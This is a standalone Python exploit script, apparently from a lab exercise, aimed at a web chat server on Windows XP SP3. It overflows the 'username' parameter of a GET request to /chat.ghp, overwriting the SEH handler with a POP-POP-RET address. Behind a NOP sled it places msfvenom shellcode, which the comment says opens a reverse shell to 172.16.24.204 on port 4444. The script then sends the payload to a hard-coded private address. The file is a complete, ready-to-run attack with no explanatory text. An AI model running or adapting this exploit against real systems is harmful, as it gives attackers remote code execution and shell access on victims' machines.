#!/usr/bin/python

# Works on Windows XP SP3
import socket

host = "172.16.24.213"
port = 80

# POP, POP, RET => 0x1001b2e1
SEH = "\xe1\xb2\x01\x10"

# Msfvenom generated reverse shell to 172.16.24.204 at port 4444
buf =  b""
buf += b"\xb8\xad\x39\x9d\xba\xda\xdb\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x52\x83\xc2\x04\x31\x42\x0e\x03\xef\x37\x7f"
buf += b"\x4f\x13\xaf\xfd\xb0\xeb\x30\x62\x38\x0e\x01\xa2\x5e"
buf += b"\x5b\x32\x12\x14\x09\xbf\xd9\x78\xb9\x34\xaf\x54\xce"
buf += b"\xfd\x1a\x83\xe1\xfe\x37\xf7\x60\x7d\x4a\x24\x42\xbc"
buf += b"\x85\x39\x83\xf9\xf8\xb0\xd1\x52\x76\x66\xc5\xd7\xc2"
buf += b"\xbb\x6e\xab\xc3\xbb\x93\x7c\xe5\xea\x02\xf6\xbc\x2c"
buf += b"\xa5\xdb\xb4\x64\xbd\x38\xf0\x3f\x36\x8a\x8e\xc1\x9e"
buf += b"\xc2\x6f\x6d\xdf\xea\x9d\x6f\x18\xcc\x7d\x1a\x50\x2e"
buf += b"\x03\x1d\xa7\x4c\xdf\xa8\x33\xf6\x94\x0b\x9f\x06\x78"
buf += b"\xcd\x54\x04\x35\x99\x32\x09\xc8\x4e\x49\x35\x41\x71"
buf += b"\x9d\xbf\x11\x56\x39\x9b\xc2\xf7\x18\x41\xa4\x08\x7a"
buf += b"\x2a\x19\xad\xf1\xc7\x4e\xdc\x58\x80\xa3\xed\x62\x50"
buf += b"\xac\x66\x11\x62\x73\xdd\xbd\xce\xfc\xfb\x3a\x30\xd7"
buf += b"\xbc\xd4\xcf\xd8\xbc\xfd\x0b\x8c\xec\x95\xba\xad\x66"
buf += b"\x65\x42\x78\x28\x35\xec\xd3\x89\xe5\x4c\x84\x61\xef"
buf += b"\x42\xfb\x92\x10\x89\x94\x39\xeb\x5a\x37\xad\xeb\x56"
buf += b"\x2f\xcc\x0b\x76\xec\x59\xed\x12\x1c\x0c\xa6\x8a\x85"
buf += b"\x15\x3c\x2a\x49\x80\x39\x6c\xc1\x27\xbe\x23\x22\x4d"
buf += b"\xac\xd4\xc2\x18\x8e\x73\xdc\xb6\xa6\x18\x4f\x5d\x36"
buf += b"\x56\x6c\xca\x61\x3f\x42\x03\xe7\xad\xfd\xbd\x15\x2c"
buf += b"\x9b\x86\x9d\xeb\x58\x08\x1c\x79\xe4\x2e\x0e\x47\xe5"
buf += b"\x6a\x7a\x17\xb0\x24\xd4\xd1\x6a\x87\x8e\x8b\xc1\x41"
buf += b"\x46\x4d\x2a\x52\x10\x52\x67\x24\xfc\xe3\xde\x71\x03"
buf += b"\xcb\xb6\x75\x7c\x31\x27\x79\x57\xf1\x57\x30\xf5\x50"
buf += b"\xf0\x9d\x6c\xe1\x9d\x1d\x5b\x26\x98\x9d\x69\xd7\x5f"
buf += b"\xbd\x18\xd2\x24\x79\xf1\xae\x35\xec\xf5\x1d\x35\x25"

buffer = "GET /chat.ghp?username=" + "B" * (202-2) + "\xeb\x07" + SEH + "\x90" * 20 + buf + (5010 - 202 - 4 - 2 - len(buf)) *"\x90" + "&password=FUZZ&room=1&sex=2 HTTP/1.1\r\n"
buffer += "Host: 172.16.24.213\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
print ("[+] Payload sent")
s.close()
